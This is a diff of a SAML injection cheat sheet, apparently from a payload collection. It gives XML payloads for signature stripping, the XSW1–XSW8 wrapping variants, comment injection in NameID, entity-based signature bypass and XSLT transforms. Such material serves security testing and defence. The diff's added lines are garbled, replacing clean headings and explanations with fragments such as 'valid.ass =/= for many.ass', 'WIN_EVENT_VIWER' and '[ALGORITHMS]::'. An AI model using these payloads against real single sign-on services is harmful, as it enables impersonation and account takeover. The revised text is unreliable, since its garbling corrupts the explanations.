@@ -1,8 +1,8 @@
 # SAML Injection
 
-> Security Assertion Markup Language (SAML) is an open standard that allows security credentials to be shared by multiple computers across a network. When using SAML-based Single Sign-On (SSO), three distinct parties are involved. There is a user (the so-called principal), an IDentity Provider (IDP), and a cloud application Service Provider (SP).  - centrify
-
-## Summary
+> Security Assertion Markup Language (SAML) is an open standard that allows security credentials to be shared by multiple computers across a network. 
+> When using SAML-based Single Sign-On (SSO), three distinct parties are involved... 
+>User (principal), an IDentity Provider (IDP), and a cloud application Service Provider (SP)...- centrify
 
 * [Tools](#tools)
 * [Authentication Bypass](#authentication-bypass)
@@ -12,29 +12,15 @@
   * [XML Comment Handling](#xml-comment-handling)
   * [XML External Entity](#xml-external-entity)
   * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)
-
-## Tools
-
 - [SAML Raider - Burp Extension](https://github.com/SAMLRaider/SAMLRaider)
-
-
-## Authentication Bypass
-
-A SAML Response should contain the `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`.
-
-### Invalid Signature
-
-Signatures which are not signed by a real CA are prone to cloning. Ensure the signature is signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed certificate to replace it.
-
-### Signature Stripping
-
-> [...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn
-
-The goal is to forge a well formed SAML Assertion without signing it. For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed.
-
-Example of SAML assertion where `NameID=admin` without signature.
-
-```xml
+0auth 
+>A SAML Response should contain the `<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"`.
+>Invalid Signatures which are not signed by a real CA are prone to cloning. 
+>Ensure the signature is signed by a real Certified Authority == CA. If the certificate is self-signed, you may be able to clone the certificate Self-Sign SSC
+> [...]accepting unsigned SAML assertions is accepting a username without checking the password - @ilektrojohn --sig --strip
+> The goal is to forge a well formed SAML Assertion without signing it. 
+>For some default configurations if the signature section is omitted from a SAML response, then no signature verification is performed.
+>Example of SAML assertion where `NameID=admin` without signature.
 <?xml version="1.0" encoding="UTF-8"?>
 <saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="http://localhost:7001/saml2/sp/acs/post" ID="id39453084082248801717742013" IssueInstant="2018-04-22T10:28:53.593Z" Version="2.0">
     <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" Format="urn:oasis:names:tc:SAML:2.0:nameidformat:entity">REDACTED</saml2:Issuer>
@@ -61,12 +47,8 @@ Example of SAML assertion where `NameID=admin` without signature.
         </saml2:AuthnStatement>
     </saml2:Assertion>
 </saml2p:Response>
-```
-
-### XML Signature Wrapping Attacks
-
-XML Signature Wrapping (XSW) attack, some implementations check for a valid signature and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently depending on the order of assertions.
-
+# XML Signature Wrapping (XSW) attack
+>>>xxx.com/imp/ -check for --sig === valid.ass =/= for many.ass or many.sig ass.diff
 - XSW1 – Applies to SAML Response messages. Add a cloned unsigned copy of the Response after the existing signature.
 - XSW2 – Applies to SAML Response messages. Add a cloned unsigned copy of the Response before the existing signature.
 - XSW3 – Applies to SAML Assertion messages. Add a cloned unsigned copy of the Assertion before the existing Assertion.
@@ -75,15 +57,11 @@ XML Signature Wrapping (XSW) attack, some implementations check for a valid sign
 - XSW6 – Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed after the original signature.
 - XSW7 – Applies to SAML Assertion messages. Add an “Extensions” block with a cloned unsigned assertion.
 - XSW8 – Applies to SAML Assertion messages. Add an “Object” block containing a copy of the original assertion with the signature removed.
-
-
-In the following example, these terms are used.
-
+>In the following example, these terms are used.
 - FA: Forged Assertion
 - LA: Legitimate Assertion
 - LAS: Signature of the Legitimate Assertion
-
-```xml
+WIN_EVENT_VIWER
 <SAMLResponse>
   <FA ID="evil">
       <Subject>Attacker</Subject>
@@ -96,42 +74,28 @@ In the following example, these terms are used.
       </LAS>
   </LA>
 </SAMLResponse>
-```
-
-In the Github Enterprise vulnerability, this request would verify and create a sessions for `Attacker` instead of `Legitimate User`, even if `FA` is not signed.
-
-
-### XML Comment Handling
-
-A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual’s SSO password. This [vulnerability](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png) has multiple CVE in the following libraries and products.
-
+>In the Github Enterprise vulnerability, this request would verify and create a sessions for `Attacker` instead of `Legitimate User`, even if `FA` is not signed.
+# XML Comment Handling
+>A threat actor who already has authenticated access into a SSO system can authenticate as another user without that individual’s SSO password. 
+>This [vulnerability](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png) has multiple CVE in the following libraries and products.
 - OneLogin - python-saml - CVE-2017-11427
 - OneLogin - ruby-saml - CVE-2017-11428
 - Clever - saml2-js - CVE-2017-11429
 - OmniAuth-SAML - CVE-2017-11430
 - Shibboleth - CVE-2018-0489
 - Duo Network Gateway - CVE-2018-7340
-
-Researchers have noticed that if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.
-
-```xml
+>[ALGORITHMS]::if an attacker inserts a comment inside the username field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.
 <SAMLResponse>
     <Issuer>https://idp.com/</Issuer>
     <Assertion ID="_id1234">
         <Subject>
             <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>
-```
-Where `user@user.com` is the first part of the username, and `.evil.com` is the second.
-
-### XML External Entity
-
-An alternative exploitation would use `XML entities` to bypass the signature verification, since the content will not change, except during XML parsing.
-
-In the following example:
+>Where `user@user.com` is the first part of the username, and `.evil.com` is the second.
+# XML External Entity
+>An alternative exploitation would use `XML entities` to bypass the signature verification, since the content will not change, except during XML parsing.
+>In the following example:
 - `&s;` will resolve to the string `"s"`
 - `&f1;` will resolve to the string `"f1"`
-
-```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE Response [
   <!ENTITY s "s">
@@ -152,21 +116,12 @@ In the following example:
   </saml2:Attribute>
 [...]
 </saml2p:Response>
-```
-
-The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports "taf" as the value of the "uid" attribute.
-
-
-### Extensible Stylesheet Language Transformation
-
-An XSLT can be carried out by using the `transform` element.
-
+>The SAML response is accepted by the service provider. Due to the vulnerability, the service provider application reports "taf" as the value of the "uid" attribute.
+# Extensible Stylesheet Language Transformation
+>An XSLT can be carried out by using the `transform` element.
 ![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)    
-Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)    
-
-```xml
+P i c t u r e from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)    
 <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
-  ...
     <ds:Transforms>
       <ds:Transform>
         <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
@@ -180,12 +135,8 @@ Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_At
         </xsl:stylesheet>
       </ds:Transform>
     </ds:Transforms>
-  ...
 </ds:Signature>
-```
-
-## References
-
+# References
 - [SAML Burp Extension - ROLAND BISCHOFBERGER - JULY 24, 2015](https://blog.compass-security.com/2015/07/saml-burp-extension/)
 - [The road to your codebase is paved with forged assertions - @ilektrojohn - March 13, 2017](http://www.economyofmechanism.com/github-saml)
 - [SAML_Security_Cheat_Sheet.md - OWASP](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)
